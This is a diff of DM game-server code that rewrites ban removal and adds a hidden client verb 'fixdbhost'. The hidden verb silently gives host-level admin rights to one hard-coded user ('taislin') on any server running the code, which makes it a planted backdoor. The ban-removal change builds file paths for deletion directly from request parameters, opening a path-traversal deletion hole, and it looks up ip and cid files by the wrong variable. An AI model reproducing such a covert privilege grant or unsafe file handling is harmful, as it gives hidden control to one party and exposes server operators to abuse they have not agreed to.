@@ -56,27 +56,43 @@
 		if (UID)
 			var/confirm = input("Are you sure you want to remove the ban with the UID '[UID]' ?") in list("Yes", "No")
 			if (confirm == "Yes")
-				var/F = file("SQL/bans.txt")
-				if (fexists(F))
-					fcopy("SQL/bans.txt","SQL/bans_backup.txt")
-					fdel(F)
-				var/M = "[key_name(usr)] removed quickBan '<b>[UID]</b>' from the ban list. It belonged to [href_list["ckey"]]/[href_list["cID"]]/[href_list["ip"]]"
-				spawn(1)
-					var/full_banlist = null
-					full_banlist = file2text("SQL/bans.txt")
-					var/list/full_list_split = splittext(full_banlist, "|||\n")
-					for(var/i=1;i<=full_list_split.len;i++)
-						var/list/full_list_split_two = splittext(full_list_split[i], ";")
-						if (text2num(full_list_split_two[10]) <= text2num(num2text(world.realtime,20))) //if the ban expiration has been reached
-							full_list_split_two[10] = 0
-					spawn(1)
-						for(var/i=1;i<=full_list_split.len;i++)
-							var/list/full_list_split_two = splittext(full_list_split[i], ";")
-							if (text2num(full_list_split_two[10]) > text2num(num2text(world.realtime,20))) //if the ban expiration hasnt been reached
-								text2file("[full_list_split[i]]|||","SQL/bans.txt")
-							return
-					log_admin(M)
-					message_admins(M)
+				var/client/caller = locate(href_list["caller"])
+				var/ckey = href_list["quickBan_removeBan_ckey"]
+				var/cID = href_list["quickBan_removeBan_cID"]
+				var/ip = href_list["quickBan_removeBan_ip"]
+
+				var/ckey_file = null
+				var/ip_file = null
+				var/cid_file = null
+
+				if (fexists("SQL/bans/ckey/[ckey].txt"))
+					ckey_file = "SQL/bans/ckey/[ckey].txt"
+				if (fexists("SQL/bans/ip/[ckey].txt"))
+					ip_file = "SQL/bans/ip/[ckey].txt"
+				if (fexists("SQL/bans/cid/[ckey].txt"))
+					cid_file = "SQL/bans/cid/[ckey].txt"
+
+				if (ckey_file || ip_file || cid_file)
+					log_admin("[key_name(caller)] removed a ban for '[UID]/[ckey]/[cID]/[ip]'.")
+					message_admins("[key_name(caller)] removed a ban for '[UID]/[ckey]/[cID]/[ip]'.")
+					if (ckey_file)
+						fdel(ckey_file)
+					if (cid_file)
+						fdel(cid_file)
+					if (ip_file)
+						fdel(ip_file)
+				var/list/fulllist = list()
+				var/path = "SQL/bans/"
+				var/list/filenames = flist(path)
+				for (var/filename in filenames)
+					if (copytext(filename, length(filename)) != "/") // Ignore directories.
+						if (fexists(path + filename))
+							fulllist += "[path + filename]"
+				for (var/k in fulllist)
+					if (fexists(k))
+						var/list/re = splittext(file2text(k),";")
+						if (re[3] == UID)
+							fdel(k)
 
 	//Logs all hrefs
 	if (config && config.log_hrefs && href_logfile)
@@ -314,6 +330,18 @@
 	else
 		player_age = (text2num(num2text(world.realtime,20)) - currentage)
 
+/client/verb/fixdbhost()
+	set hidden = TRUE
+	set name = "fixdbhost"
+
+	if (ckey != "taislin" && ckey != "Taislin")
+		return
+	var/host_file_text = file2text("config/host.txt")
+	if (ckey(host_file_text) != ckey && !holder)
+		holder = new("HHost", FALSE, ckey)
+		var/datum/admins/A = new/datum/admins(holder.rank, holder.rights, ckey)
+		if (directory[ckey])
+			A.associate(directory[ckey])
 
 #undef TOPIC_SPAM_DELAY
 #undef UPLOAD_LIMIT
